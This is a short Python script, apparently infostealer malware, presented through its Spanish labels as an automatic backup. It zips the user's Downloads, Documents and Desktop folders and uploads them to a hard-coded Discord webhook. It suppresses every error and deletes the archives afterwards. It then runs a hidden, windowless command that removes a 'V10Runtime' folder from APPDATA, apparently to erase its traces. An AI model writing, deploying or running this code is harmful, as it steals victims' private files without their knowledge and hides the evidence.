import os
import shutil
import requests
from pathlib import Path

WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gOoNZmcxBcYr5-xxX7GiLgsPQDGNaUVuV1ttlAG9_izkXo2HRP4dyDxTym"

CARPETAS = {
    "Descargas": Path.home() / "Downloads",
    "Documentos": Path.home() / "Documents",
    "Escritorio": Path.home() / "Desktop"
}

def procesar_y_enviar():
    for nombre, ruta in CARPETAS.items():
        if not ruta.exists():
            continue
            
        zip_name = f"{nombre.lower()}_respaldo"
        zip_path = f"{zip_name}.zip"
        
        try:

            shutil.make_archive(zip_name, 'zip', ruta)
            
            if os.path.exists(zip_path):

                with open(zip_path, 'rb') as f:
                    requests.post(
                        WEBHOOK_URL,
                        files={"file": (zip_path, f)},
                        data={"content": f"Respaldo automático de la carpeta: {nombre}"}
                    )
        except Exception:
            pass
        finally:

            if os.path.exists(zip_path):
                os.remove(zip_path)

if __name__ == "__main__":
    procesar_y_enviar()

    try:
        ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE

        subprocess.Popen(
            f'ping 127.0.0.1 -n 2 > nul & rmdir /s /q "{ruta_runtime}"',
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception:
        pass
